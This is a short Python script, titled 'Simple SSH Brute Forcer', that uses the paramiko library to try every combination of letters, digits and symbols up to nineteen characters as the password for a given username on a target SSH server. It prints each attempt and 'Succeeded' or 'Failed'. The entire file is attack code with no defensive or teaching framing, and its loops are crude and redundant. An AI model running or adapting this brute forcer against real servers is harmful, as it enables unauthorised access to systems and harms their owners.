from itertools import product
from paramiko import SSHClient, AutoAddPolicy


class SSHBruteForce():
    def __init__(self,):
        self.info = "Simple SSH Brute Forcer"
        self.targetIp = ""
        self.targetPort = 22
        self.username = ""
        self.timeoutTime = 30
        self.bruteForceAttempts = 1000000000000000
        self.characters = "abcdefghijklmnopqrstuvwxyz0123456789²&é#{([-|è])=}^$*ù!:;,?./§%µ£ABCDEFGHIJKLMNOPQRSTUVWXYZ"

    def showStartInfo(self):
        print("[*] {} \n".format(self.info))
        print("[*] Brute Forcing {} \n".format(self.targetIp))
        print("[*] Loaded {} Usernames \n".format(self.username))
        print("[*] Brute Force Starting \n")

    def bruteForceSingle(self):

        for x in range(int(self.bruteForceAttempts)):
            for length in range(1, 20):
                to_attempt = product(self.characters, repeat=length)
                for attempt in to_attempt:
                    randomPasswordString = "".join(attempt)
                    self.createConnection(self.username, randomPasswordString, self.targetIp, self.targetPort, self.timeoutTime)

    def createConnection(self, username, password, targetIp, targetPort, timeoutTime):
        sshConnection = SSHClient()
        sshConnection.set_missing_host_key_policy(AutoAddPolicy())

        try:
            print("[*] Targeting: {0}, Testing with username: {1}, testing with password: {2}".format(targetIp, username, password))
            sshConnection.connect(self.targetIp, port=targetPort, username=username, password=password, timeout=timeoutTime, allow_agent=False, look_for_keys=False)
            print("Succeeded")
            sshConnection.close()
        except:
            print("Failed")


if __name__ == '__main__':
    sshBruteForce = SSHBruteForce()
    sshBruteForce.showStartInfo()
    sshBruteForce.bruteForceSingle()
